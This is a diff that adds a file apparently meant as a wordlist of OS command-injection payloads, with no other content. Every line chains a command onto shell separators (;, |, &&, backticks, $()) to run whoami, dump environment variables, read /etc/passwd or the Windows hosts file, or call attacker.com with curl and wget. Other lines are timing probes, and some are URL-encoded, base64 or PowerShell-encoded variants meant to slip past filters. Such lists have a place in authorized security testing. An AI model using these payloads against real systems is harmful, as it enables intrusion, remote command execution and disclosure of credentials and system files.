@@ -1,0 +1,38 @@
+; whoami
+| whoami
+& whoami
+&& whoami
+|| whoami
+`whoami`
+$(whoami)
+${whoami}
+; ls
+| ls
+; dir
+| dir
+; cat /etc/passwd
+| cat /etc/passwd
+; type C:\Windows\System32\drivers\etc\hosts
+; ping -c 1 google.com
+| ping -c 1 google.com
+; nslookup google.com
+| nslookup google.com
+; curl http://attacker.com
+| wget http://attacker.com
+; uname -a
+| uname -a
+; systeminfo
+| systeminfo
+; env
+| env
+; set
+| set
+; sleep 5
+| sleep 5
+; ping -c 5 127.0.0.1
+| ping -n 5 127.0.0.1
+%3B%20whoami
+%7C%20whoami
+OyB3aG9hbWk=
+; powershell.exe -Command whoami
+| powershell.exe -EncodedCommand dwBoAG8AYQBtAGkA
